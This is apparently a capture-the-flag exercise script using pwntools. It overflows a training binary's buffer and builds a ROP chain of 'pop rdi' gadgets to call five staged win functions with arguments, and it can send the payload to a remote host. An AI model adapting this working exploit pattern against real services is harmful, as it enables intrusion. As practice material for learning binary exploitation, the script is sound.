from pwn import *
from grwnapy.pwn import find_offset

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

if args.REMOTE:
    exe = "/home/grwcha/grwna/.example_elf"
else:
    exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

offset = find_offset(exe, cyclic(500))
win1 = elf.symbols['win_stage_1']
win2 = elf.symbols['win_stage_2']
win3 = elf.symbols['win_stage_3']
win4 = elf.symbols['win_stage_4']
win5 = elf.symbols['win_stage_5']

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address


io = start()

payload = flat([
    b"A"*offset,
    pop_rdi,
    1,
    win1,
    pop_rdi,
    2,
    win2,
    pop_rdi,
    3,
    win3,
    pop_rdi,
    4,
    win4,
    pop_rdi,
    5,
    win5
])

open("payload","wb").write(payload)

io.sendlineafter(b'', payload)
io.recvuntil(b'')

io.interactive()

"""
Desc: 
    Use ROP to trigger a multi-stage win function!
Explanation:
    Same with two but more stages, and each stage requires an argument, which means we need to start using ROP gadgets.
    Each arguments are just the stage number, so we craft a ROP chain to pop those values to RDI then return to the stages's win
"""